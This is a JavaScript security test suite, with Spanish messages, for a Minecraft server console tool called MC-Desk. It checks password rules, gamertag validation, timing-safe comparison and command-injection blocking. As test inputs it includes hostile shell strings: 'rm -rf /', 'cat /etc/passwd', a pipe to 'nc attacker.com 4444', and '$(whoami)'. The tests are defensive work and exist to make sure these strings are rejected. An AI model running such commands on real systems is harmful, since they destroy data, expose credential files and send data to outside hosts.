const assert = require('assert');
const {
  validatePasswordPolicy,
  sanitizeMinecraftGamertag,
  sanitizeConsoleCommand,
  timingSafeEqual,
  DUMMY_BCRYPT_HASH
} = require('../src/middleware/security');

console.log('🧪 Iniciando Suite de Pruebas de Seguridad para MC-Desk...\n');

let passed = 0;
let failed = 0;

function test(name, fn) {
  try {
    fn();
    console.log(`  ✅ ${name}`);
    passed++;
  } catch (err) {
    console.error(`  ❌ ${name}:`, err.message);
    failed++;
  }
}

// -------------------------------------------------------------
// 1. Password Policy Tests
// -------------------------------------------------------------
console.log('📋 Grupo 1: Políticas de Complejidad de Contraseña');

test('Rechaza contraseñas con menos de 8 caracteres', () => {
  const res = validatePasswordPolicy('Ab1!');
  assert.strictEqual(res.valid, false);
  assert(res.errors.some(e => e.includes('8 caracteres')));
});

test('Rechaza contraseñas sin mayúsculas', () => {
  const res = validatePasswordPolicy('minecraft123!');
  assert.strictEqual(res.valid, false);
  assert(res.errors.some(e => e.includes('mayúscula')));
});

test('Rechaza contraseñas sin minúsculas', () => {
  const res = validatePasswordPolicy('MINECRAFT123!');
  assert.strictEqual(res.valid, false);
  assert(res.errors.some(e => e.includes('minúscula')));
});

test('Rechaza contraseñas sin números', () => {
  const res = validatePasswordPolicy('MinecraftSecret!');
  assert.strictEqual(res.valid, false);
  assert(res.errors.some(e => e.includes('número')));
});

test('Rechaza contraseñas sin caracteres especiales', () => {
  const res = validatePasswordPolicy('Minecraft2024');
  assert.strictEqual(res.valid, false);
  assert(res.errors.some(e => e.includes('especial')));
});

test('Acepta contraseñas robustas de nivel empresarial', () => {
  const res = validatePasswordPolicy('Minecraft2024!Secure');
  assert.strictEqual(res.valid, true);
  assert.strictEqual(res.errors.length, 0);
});

// -------------------------------------------------------------
// 2. Minecraft Gamertag Whitelist Sanitizer Tests
// -------------------------------------------------------------
console.log('\n📋 Grupo 2: Validación y Sanitización de Gamertag de Minecraft');

test('Acepta nombres de usuario alfanuméricos válidos', () => {
  assert.strictEqual(sanitizeMinecraftGamertag('Steve'), 'Steve');
  assert.strictEqual(sanitizeMinecraftGamertag('Alex_2024'), 'Alex_2024');
  assert.strictEqual(sanitizeMinecraftGamertag('ProGamer99'), 'ProGamer99');
});

test('Rechaza nombres con caracteres especiales o espacios', () => {
  assert.strictEqual(sanitizeMinecraftGamertag('Steve 123'), null);
  assert.strictEqual(sanitizeMinecraftGamertag('Steve;rm'), null);
  assert.strictEqual(sanitizeMinecraftGamertag('<script>'), null);
  assert.strictEqual(sanitizeMinecraftGamertag(''), null);
});

test('Rechaza nombres fuera del rango de 2 a 16 caracteres', () => {
  assert.strictEqual(sanitizeMinecraftGamertag('A'), null); // Demasiado corto
  assert.strictEqual(sanitizeMinecraftGamertag('UnNombreDemasiadoLargoParaMinecraft123'), null); // > 16
});

// -------------------------------------------------------------
// 3. Command Injection & Shell Breakout Tests
// -------------------------------------------------------------
console.log('\n📋 Grupo 3: Prevención de Inyección de Comandos de Consola');

test('Acepta comandos válidos de Minecraft', () => {
  const res = sanitizeConsoleCommand('give Steve diamond 64');
  assert.strictEqual(res.isValid, true);
  assert.strictEqual(res.sanitized, 'give Steve diamond 64');
});

test('Limpia slashes iniciales redundantes (/op -> op)', () => {
  const res = sanitizeConsoleCommand('///gamemode creative Steve');
  assert.strictEqual(res.isValid, true);
  assert.strictEqual(res.sanitized, 'gamemode creative Steve');
});

test('Bloquea intentos de escape con punto y coma (; rm -rf /)', () => {
  const res = sanitizeConsoleCommand('give Steve diamond; rm -rf /');
  assert.strictEqual(res.isValid, false);
  assert(res.error.includes('shell no permitidos'));
});

test('Bloquea operadores de encadenamiento bash (&&, ||, |)', () => {
  const res1 = sanitizeConsoleCommand('give Steve diamond && cat /etc/passwd');
  assert.strictEqual(res1.isValid, false);

  const res2 = sanitizeConsoleCommand('say Hola | nc attacker.com 4444');
  assert.strictEqual(res2.isValid, false);
});

test('Bloquea subshells y sustitución de variables ($(whoami), `id`, ${HOME})', () => {
  const res1 = sanitizeConsoleCommand('say $(whoami)');
  assert.strictEqual(res1.isValid, false);

  const res2 = sanitizeConsoleCommand('say `cat /flag`');
  assert.strictEqual(res2.isValid, false);

  const res3 = sanitizeConsoleCommand('say $USER');
  assert.strictEqual(res3.isValid, false);
});

test('Bloquea comandos que excedan la longitud segura (250 caracteres)', () => {
  const longCmd = 'give Steve diamond ' + 'a'.repeat(300);
  const res = sanitizeConsoleCommand(longCmd);
  assert.strictEqual(res.isValid, false);
  assert(res.error.includes('demasiado largo'));
});

// -------------------------------------------------------------
// 4. Timing Attack & Cryptographic Defense Tests
// -------------------------------------------------------------
console.log('\n📋 Grupo 4: Mitigación de Ataques de Temporización');

test('timingSafeEqual compara cadenas idénticas con éxito', () => {
  assert.strictEqual(timingSafeEqual('secure_token_12345', 'secure_token_12345'), true);
});

test('timingSafeEqual rechaza cadenas diferentes en tiempo constante', () => {
  assert.strictEqual(timingSafeEqual('secure_token_12345', 'wrong_token_99999'), false);
  assert.strictEqual(timingSafeEqual('token_short', 'token_much_longer_string'), false);
});

test('DUMMY_BCRYPT_HASH tiene formato y coste estándar de 10 rondas', () => {
  assert.strictEqual(typeof DUMMY_BCRYPT_HASH, 'string');
  assert(DUMMY_BCRYPT_HASH.startsWith('$2a$10$'));
});

// -------------------------------------------------------------
// Resumen Final
// -------------------------------------------------------------
console.log(`\n=============================================================`);
console.log(`  Resultados de Pruebas: ${passed} Exitosas, ${failed} Fallidas`);
console.log(`=============================================================`);

if (failed > 0) {
  process.exit(1);
} else {
  console.log('🎉 ¡Todas las pruebas de seguridad pasaron satisfactoriamente!');
}
